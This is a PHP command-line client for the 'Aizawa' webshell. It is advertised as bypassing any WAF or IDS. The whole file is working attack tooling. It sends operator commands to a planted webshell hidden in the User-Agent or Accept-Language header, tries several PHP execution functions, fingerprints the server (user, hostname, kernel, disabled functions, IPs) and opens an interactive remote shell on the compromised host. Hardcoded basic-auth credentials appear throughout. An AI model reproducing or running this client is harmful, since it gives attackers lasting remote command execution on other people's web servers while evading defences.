<?php
//--------------------------------------------------//
//                                                  //
//                  A I Z A W A                     //
//                                                  //
// Simple command Line webshell by @elliottophellia //
//                                                  //
// Usage : aizawa.php [url]                         //
//                                                  //
//--------------------------------------------------//
//         Remove Useless Error Messages            //
//--------------------------------------------------//
error_reporting(0);
//--------------------------------------------------//
//                   Color                          //
//--------------------------------------------------//
$bold = "\033[1m";
$red = "\033[31m";
$green = "\033[32m";
$yellow = "\033[33m";
$blue = "\033[34m";
$purple = "\033[35m";
$clear = "\033[0m";
//--------------------------------------------------//
//                  Functions                       //
//--------------------------------------------------//
function http_user_agent($url, $cmd)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $cmd);
    curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
    curl_setopt($ch, CURLOPT_USERPWD, '877404bee17727eb11292094341915de942c881b:e116e40e41cc86225be6aa85f29f33c54e55f3c6');
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function http_accept_language($url, $cmd)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept-Language: ' . $cmd));
    curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
    curl_setopt($ch, CURLOPT_USERPWD, '877404bee17727eb11292094341915de942c881b:e116e40e41cc86225be6aa85f29f33c54e55f3c6');
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function execute($url, $cmd, $type)
{
    if ($type == "http_user_agent") {
        if (!empty(http_user_agent($url . "?cmd=system", $cmd))) {
            return http_user_agent($url . "?cmd=system", $cmd);
        } elseif (!empty(http_user_agent($url . "?cmd=passthru", $cmd))) {
            return http_user_agent($url . "?cmd=passthru", $cmd);
        } elseif (!empty(http_user_agent($url . "?cmd=shell_exec", $cmd))) {
            return http_user_agent($url . "?cmd=shell_exec", $cmd);
        } elseif (!empty(http_user_agent($url . "?cmd=exec", $cmd))) {
            return http_user_agent($url . "?cmd=exec", $cmd);
        } else {
            return $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] . "\n";
        }
    } elseif ($type == "http_accept_language") {
        if (!empty(http_accept_language($url . "?cmd=system", $cmd))) {
            return http_accept_language($url . "?cmd=system", $cmd);
        } elseif (!empty(http_accept_language($url . "?cmd=passthru", $cmd))) {
            return http_accept_language($url . "?cmd=passthru", $cmd);
        } elseif (!empty(http_accept_language($url . "?cmd=shell_exec", $cmd))) {
            return http_accept_language($url . "?cmd=shell_exec", $cmd);
        } elseif (!empty(http_accept_language($url . "?cmd=exec", $cmd))) {
            return http_accept_language($url . "?cmd=exec", $cmd);
        } else {
            return $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] . "\n";
        }
    }
}
//--------------------------------------------------//
//              Display Banner                      //
//--------------------------------------------------//

print "$GLOBALS[yellow]
   ___   ________  ___ _      _____ 
  / _ | /  _/_  / / _ | | /| / / _ |
 / __ |_/ /  / /_$GLOBALS[blue]/ __ | |/ |/ / __ |
/_/ |_/___/ /___/_/ |_|__/|__/_/ |_|$GLOBALS[clear]
A Super Simple Command Line Webshell
For Bypassing Any Kind of WAF or IDS
Code by $GLOBALS[bold]@$GLOBALS[red]elliottophellia$GLOBALS[clear]    $GLOBALS[bold]#$GLOBALS[red]V$GLOBALS[purple]S$GLOBALS[blue]P$GLOBALS[yellow]O$GLOBALS[clear]Fan
";
//--------------------------------------------------//
//              Check for URL                       //
//--------------------------------------------------//
$url = $argv[1] ?? readline("Webshell URL: ");
if (filter_var($url, FILTER_VALIDATE_URL) === FALSE) {
    print "
$GLOBALS[bold]$GLOBALS[red]WARNING!$GLOBALS[clear]
This does not appear to be a valid Aizawa webshell
Please check the URL and dont change the filename
";
    exit;
}
$remove_cmd = preg_match('/^.*(?:\.)[a-zA-Z]+/m', $url, $matches);
$url = $matches[0];
//--------------------------------------------------//
//       Check if URL http header is 200            //
//--------------------------------------------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, '877404bee17727eb11292094341915de942c881b:e116e40e41cc86225be6aa85f29f33c54e55f3c6');
$result = curl_exec($ch);
$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
if ($httpcode != 200) {
    print "
$GLOBALS[bold]$GLOBALS[red]WARNING!$GLOBALS[clear]
This does not appear to be a valid Aizawa webshell
Please check the URL and dont change the filename
";
    exit;
}
//--------------------------------------------------//
//              Check for Type                      //
//--------------------------------------------------//
$filename = substr($url, strrpos($url, '/') + 1);
$hua = preg_match('/aizawa_hua_(.*)\.php/', $filename, $hua);
$hal = preg_match('/aizawa_hal_(.*)\.php/', $filename, $hal);
if ($hua) {
    $type = "http_user_agent";
} elseif ($hal) {
    $type = "http_accept_language";
} else {
    print "
$GLOBALS[bold]$GLOBALS[red]WARNING!$GLOBALS[clear]
This does not appear to be a valid Aizawa webshell
Please check the URL and dont change the filename
";
    exit;
}
//--------------------------------------------------//
//              Check for User                      //
//--------------------------------------------------//
$user = execute($url, "whoami", $type);
$user = preg_replace('/\s+/', '', $user);
$user = empty($user) ? "aizawaema" : $user;
//--------------------------------------------------//
//              Check for Host                      //
//--------------------------------------------------//
$hostname = execute($url, "hostname", $type);
$hostname = preg_replace('/\s+/', '', $hostname);
$hostname = empty($hostname) ? "virtualesport" : $hostname;
//--------------------------------------------------//
//              Server information                  //
//--------------------------------------------------//
$kernel = file_get_contents($url . "?unamea");
$kernel = empty($kernel) ? $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $kernel . $GLOBALS["clear"];
$disablefunc = file_get_contents($url . "?disable_functions");
$disablefunc = $disablefunc == "NONE" ? $GLOBALS["green"] . $disablefunc . $GLOBALS["clear"] : $GLOBALS["red"] . $disablefunc . $GLOBALS["clear"];
$server = file_get_contents($url . "?server");
$server = empty($server) ? $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $server . $GLOBALS["clear"];
$safemode = file_get_contents($url . "?safe_mode");
$safemode = $safemode == "ON" ? $GLOBALS["red"] . $safemode . $GLOBALS["clear"] : $GLOBALS["green"] . $safemode . $GLOBALS["clear"];
$sip = file_get_contents($url . "?server_ip");
$sip = empty($sip) ? $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $sip . $GLOBALS["clear"];
$cip = file_get_contents($url . "?client_ip");
$cip = empty($cip) ? $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $cip . $GLOBALS["clear"];
print "

Kernel       :  $kernel 
Server       :  $server 
Safe Mode    :  $safemode
Server IP    :  $sip   
Client IP    :  $cip  
Disable Func :  $disablefunc

";
//--------------------------------------------------//
//              Shell                               //
//--------------------------------------------------//
do {
    print $GLOBALS["yellow"] . $user . $GLOBALS["clear"] . "@" . $GLOBALS["blue"] . $hostname . $GLOBALS["clear"] . ":~" . $GLOBALS["bold"] . "$ " . $GLOBALS["clear"];
    $cmd = trim((readline()));
    readline_add_history($cmd);
    switch ($cmd) {
        case 'exit':
            break;
        default:
            print "\n" . execute($url, $cmd, $type) . "\n";
    }
} while ($cmd != 'exit');
